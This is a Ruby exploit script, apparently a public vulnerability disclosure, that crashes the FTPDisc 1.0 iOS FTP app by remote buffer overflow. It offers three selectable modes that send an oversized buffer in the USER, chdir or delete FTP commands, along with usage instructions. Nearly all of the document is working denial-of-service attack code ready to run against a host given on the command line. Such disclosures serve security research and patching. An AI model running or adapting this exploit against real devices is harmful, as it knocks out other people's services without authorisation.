###############
# Title -> iPhone / iTouch FTPDisc 1.0 3ExploitsInOne BuffOverflow DoS
# Model -> Tested on iPod Touch 3G 3.1.3
# Software -> FTPDisc 1.0 and FTPDisc 1.0 Lite http://itunes.apple.com/es/app/ftpdisc-lite-pdf-reader/id329157971?mt=8
# Attacker -> Tested from GNU/Linux (Sidux), fuzzing with a future PenTBox version :P
#
# Exploit languaje -> Ruby
# Type -> Remote Denial of Service Exploit caused by Buffer Overflow
#
#
###############
# Discovered and written by Alberto Ortega
# http://pentbox.net/
###############

require "socket"
require "net/ftp"

expl = ARGV[0]
host = ARGV[1]

puts ""
if !expl || !host
	puts "HELP - iPhone / iTouch FTPDisc 1.0 3ExploitsInOne BuffOverflow DoS"
	puts ""
	puts "Exploits: 1 - USER [MALFORMED] 2 - cd [MALF] 3 - delete [MALF]"
	puts ""
	puts "- Usage: ftpdisc3io.rb [numberofexploit] [host]"
	puts "- Example: ftpdisc3io.rb 1 192.168.1.2"
	puts ""
else
	buffer = "A"
	10.times do
		buffer = "#{buffer}#{buffer}" # Here de big buffer to send
	end
	if expl == "1" # EXPLOIT 1
		begin
			socket = TCPSocket.new(host, 21)
			puts "[*] Exploiting ..."
			socket.write("USER #{buffer}\r\n")
			puts "[*] Succesfully exploited! :)"
		rescue
			puts "Connection problem"
		end
	elsif expl == "2" || expl == "3"
		begin
			print "[*] Connecting to FTP ... "
			ftp = Net::FTP.new(host, "anonymous")
			puts "OK"
			puts "[*] Exploiting ..."
			if expl == "2"
				begin
					ftp.chdir(buffer) # EXPLOIT 2
				rescue
				end
			else
				begin
					ftp.delete(buffer) # EXPLOIT 3
				rescue
				end
			end
			puts "[*] Succesfully exploited! :)"
		rescue
			puts "Connection problem"
		end
	else
		puts "Incorrect exploit selection (1, 2, 3)"
	end
end
puts ""